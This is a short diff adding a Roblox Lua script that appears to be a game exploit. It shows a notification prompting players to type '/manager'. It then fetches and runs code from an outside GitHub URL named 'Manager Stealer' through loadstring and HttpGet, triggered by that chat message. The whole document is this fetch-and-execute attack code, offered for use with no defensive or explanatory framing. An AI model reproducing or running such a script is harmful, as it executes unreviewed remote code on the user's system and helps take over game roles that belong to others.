@@ -1,0 +1,7 @@
+game:GetService("StarterGui"):SetCore("SendNotification",{Title="To Get Started:",Text="Say /manager To Become A Manager!", Duration=15})
+local steal = loadstring(game:HttpGet("https://raw.githubusercontent.com/V31nc/Scripts/main/Manager%20Stealer"))
+workspace.Main.Chatted.Chatted.Event:Connect(function(msg)
+if msg=="/manager me" or msg=="/manager" then
+steal()
+end
+end)
